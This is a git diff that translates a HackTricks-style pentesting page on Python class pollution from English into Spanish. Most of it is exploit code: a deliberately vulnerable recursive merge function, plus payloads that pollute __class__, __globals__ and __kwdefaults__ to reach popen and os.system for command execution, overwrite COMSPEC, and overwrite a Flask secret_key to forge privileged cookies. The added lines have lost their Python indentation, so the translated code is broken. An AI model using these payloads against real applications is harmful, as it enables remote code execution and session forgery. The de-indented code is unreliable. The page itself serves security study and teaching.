@@ -1,11 +1,10 @@
-# Class Pollution (Python's Prototype Pollution)
+# Contaminación de Clases (Contaminación de Prototipos de Python)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic Example
+## Ejemplo Básico
 
-Check how is possible to pollute classes of objects with strings:
-
+Verifique cómo es posible contaminar clases de objetos con cadenas:
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -29,9 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-
-## Basic Vulnerability Example
-
+## Ejemplo Básico de Vulnerabilidad
 ```python
 # Initial state
 class Employee: pass
@@ -40,37 +37,35 @@ print(vars(emp)) #{}
 
 # Vulenrable function
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 
 USER_INPUT = {
-    "name":"Ahemd",
-    "age": 23,
-    "manager":{
-        "name":"Sarah"
-    }
+"name":"Ahemd",
+"age": 23,
+"manager":{
+"name":"Sarah"
+}
 }
 
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-
-## Gadget Examples
+## Ejemplos de Gadget
 
 <details>
 
-<summary>Creating class property default value to RCE (subprocess)</summary>
-
+<summary>Creando valor predeterminado de propiedad de clase para RCE (subprocess)</summary>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -78,31 +73,31 @@ class HR(Employee): pass # Class inherits from Employee class
 class Recruiter(HR): pass # Class inherits from HR class
 
 class SystemAdmin(Employee): # Class inherits from Employee class
-    def execute_command(self):
-        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
-        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+def execute_command(self):
+command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
+return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 USER_INPUT = {
-    "__class__":{
-        "__base__":{
-            "__base__":{
-                "custom_command": "whoami"
-            }
-        }
-    }
+"__class__":{
+"__base__":{
+"__base__":{
+"custom_command": "whoami"
+}
+}
+}
 }
 
 recruiter_emp = Recruiter()
@@ -117,30 +112,28 @@ merge(USER_INPUT, recruiter_emp)
 print(system_admin_emp.execute_command())
 #> [!] Executing: "whoami", output: "abdulrah33m"
 ```
-
 </details>
 
 <details>
 
-<summary>Polluting other classes and global vars through <code>globals</code></summary>
-
+<summary>Contaminando otras clases y variables globales a través de <code>globals</code></summary>
 ```python
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 class User:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 class NotAccessibleClass: pass
 
@@ -151,32 +144,30 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 ```
-
 </details>
 
 <details>
 
-<summary>Arbitrary subprocess execution</summary>
-
+<summary>Ejecutación arbitraria de subprocesos</summary>
 ```python
 import subprocess, json
 
 class Employee:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 # Overwrite env var "COMSPEC" to execute a calc
 USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
@@ -185,39 +176,37 @@ merge(USER_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 ```
-
 </details>
 
 <details>
 
-<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Sobrescribiendo <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** is a special attribute of all functions, based on Python [documentation](https://docs.python.org/3/library/inspect.html), it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after \* or \*args.
-
+**`__kwdefaults__`** es un atributo especial de todas las funciones, basado en la [documentación](https://docs.python.org/3/library/inspect.html) de Python, es un “mapeo de cualquier valor predeterminado para parámetros **solo de palabra clave**”. Contaminar este atributo nos permite controlar los valores predeterminados de los parámetros solo de palabra clave de una función, estos son los parámetros de la función que vienen después de \* o \*args.
 ```python
 from os import system
 import json
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 class Employee:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 def execute(*, command='whoami'):
-    print(f'Executing {command}')
-    system(command)
+print(f'Executing {command}')
+system(command)
 
 print(execute.__kwdefaults__) #> {'command': 'whoami'}
 execute() #> Executing whoami
@@ -230,40 +219,35 @@ print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
 ```
-
 </details>
 
 <details>
 
-<summary>Overwriting Flask secret across files</summary>
+<summary>Sobrescribiendo el secreto de Flask a través de archivos</summary>
 
-So, if you can do a class pollution over an object defined in the main python file of the web but **whose class is defined in a different file** than the main one. Because in order to access \_\_globals\_\_ in the previous payloads you need to access the class of the object or methods of the class, you will be able to **access the globals in that file, but not in the main one**. \
-Therefore, you **won't be able to access the Flask app global object** that defined the **secret key** in the main page:
-
+Entonces, si puedes hacer una contaminación de clase sobre un objeto definido en el archivo python principal de la web pero **cuyo clase está definida en un archivo diferente** al principal. Porque para acceder a \_\_globals\_\_ en las cargas útiles anteriores necesitas acceder a la clase del objeto o métodos de la clase, podrás **acceder a los globals en ese archivo, pero no en el principal**. \
+Por lo tanto, **no podrás acceder al objeto global de la aplicación Flask** que definió la **clave secreta** en la página principal:
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+En este escenario, necesitas un gadget para recorrer archivos y llegar al principal para **acceder al objeto global `app.secret_key`** para cambiar la clave secreta de Flask y poder [**escalar privilegios** conociendo esta clave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-In this scenario you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
-
-A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
-
+Una carga útil como esta [de este informe](https://ctftime.org/writeup/36082):
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-
-Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.
+Utiliza esta carga útil para **cambiar `app.secret_key`** (el nombre en tu aplicación podría ser diferente) para poder firmar nuevas y más privilegiadas cookies de flask.
 
 </details>
 
-Check also the following page for more read only gadgets:
+Consulta también la siguiente página para más gadgets de solo lectura:
 
 {{#ref}}
 python-internal-read-gadgets.md
 {{#endref}}
 
-## References
+## Referencias
 
 - [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
